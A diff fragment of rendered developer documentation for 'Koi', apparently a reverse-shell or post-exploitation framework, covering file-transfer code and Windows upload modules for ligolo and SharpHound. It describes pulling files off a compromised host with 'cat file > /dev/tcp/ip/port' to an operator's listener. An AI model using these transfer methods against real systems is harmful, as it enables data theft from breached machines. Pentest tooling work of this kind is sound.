+<span class="k">except</span> <span class="p">(</span><span class="ne">RuntimeError</span><span class="p">,</span> <span class="ne">TimeoutError</span><span class="p">)</span> <span class="k">as</span> <span class="n">exc</span><span class="p">:</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">err</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Transfer failed: </span><span class="si">{</span><span class="n">exc</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">return</span>
+<span class="n">bar</span><span class="o">.</span><span class="n">done</span><span class="p">()</span>
 
-<span class="c1"># 4. Write to disk</span>
 <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">local_path</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">received</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span>
 </code></pre></div>
-<p>This is essentially what <code>spawn_recv_server</code> wraps for you. Prefer <code>spawn_recv_server</code> in new modules unless you need a progress bar or custom logic during reception.</p>
+<p><code>TCPReceiveServer</code> handles the socket lifecycle, the background thread, and error propagation. See <a href="#tcpreceiveserver">TCPReceiveServer</a> below.</p>
 <hr />
 <h3 id="windows-upload-module-ligolo-sharphound-populate_win">Windows Upload Module - ligolo / sharphound / populate_win</h3>
 <p>All three upload modules follow the same pattern:</p>
@@ -1851,8 +2138,8 @@
 <h3 id="side-channel-tcp-transfer">Side-channel TCP transfer</h3>
 <p>Direct use of the shell stream for data is fragile (encoding issues, prompt pollution, ANSI sequences). Koi always uses a <strong>side TCP channel</strong> for data:</p>
 <ul>
-<li><strong>Download (remote → local):</strong> open a local listener → give port to remote → remote does <code>cat file &gt; /dev/tcp/ip/port</code> or PowerShell TcpClient write.</li>
-<li><strong>Upload (local → remote):</strong> <code>spawn_send_server</code> serves the bytes locally → remote does PowerShell TcpClient read → write to file.</li>
+<li><strong>Download (remote -&gt; local):</strong> open a local listener -&gt; give port to remote -&gt; remote does <code>cat file &gt; /dev/tcp/ip/port</code> or PowerShell TcpClient write.</li>
+<li><strong>Upload (local -&gt; remote):</strong> <code>spawn_send_server</code> serves the bytes locally -&gt; remote does PowerShell TcpClient read -&gt; write to file.</li>
 </ul>
 <p>This works reliably on both raw shells and upgraded ConPTY sessions.</p>
 <h3 id="detecting-upgraded-sessions">Detecting upgraded sessions</h3>
